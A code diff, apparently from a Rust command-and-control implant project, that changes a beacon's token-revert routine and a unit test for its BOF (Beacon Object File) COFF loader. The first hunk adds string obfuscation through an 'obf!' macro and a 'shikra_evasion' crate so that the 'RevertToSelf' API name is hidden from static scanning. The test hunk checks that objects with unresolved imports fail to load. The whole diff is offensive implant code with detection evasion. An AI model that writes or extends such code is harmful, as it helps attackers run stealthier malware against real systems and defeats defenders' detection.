@@ -697,7 +697,9 @@ unsafe extern "C" fn beacon_revert_token() -> i32 {
         let Ok(advapi) = shikra_evasion::windows::load_library("advapi32.dll") else {
             return 0;
         };
-        let Some(revert) = shikra_evasion::windows::export_address(advapi, "RevertToSelf") else {
+        let Some(revert) =
+            shikra_evasion::windows::export_address(advapi, &shikra_obf::obf!("RevertToSelf"))
+        else {
             return 0;
         };
         type RevertFn = unsafe extern "system" fn() -> i32;
@@ -1061,26 +1063,22 @@ mod tests {
     #[test]
     fn unresolved_import_is_reported() {
         let mut bytes = AMD64_BOF.to_vec();
-        // Rename `__imp_BeaconOutput` to an unknown import.
+        // Rename `__imp_BeaconOutput` to an import the host does not
+        // provide. The replacement keeps the string-table entry length.
         let needle = b"__imp_BeaconOutput\0";
-        if let Some(offset) = bytes
+        let offset = bytes
             .windows(needle.len())
             .position(|window| window == needle)
-        {
-            bytes[offset..offset + 5].copy_from_slice(b"__imp");
-        }
-        let Ok(coff) = parse(&bytes) else { return };
-        let has_unknown_import = coff
-            .symbols
-            .iter()
-            .any(|symbol| symbol.name.contains("__imp_") && symbol.section_number == 0)
-            && coff
-                .symbols
-                .iter()
-                .all(|symbol| host_function(&symbol.name).is_none());
-        if has_unknown_import {
-            assert!(execute(&bytes, b"").is_err());
-        }
+            .expect("fixture references __imp_BeaconOutput");
+        bytes[offset..offset + 18].copy_from_slice(b"__imp_NoSuchExport");
+
+        // On x86-64 hosts execution reaches import resolution and must
+        // fail; on other hosts the machine check fires first.
+        let error = execute(&bytes, b"").expect_err("unknown imports must fail");
+        assert!(
+            error.contains("unresolved") || error.contains("does not match host"),
+            "unexpected error: {error}"
+        );
     }
 
     #[cfg(all(unix, target_arch = "aarch64"))]
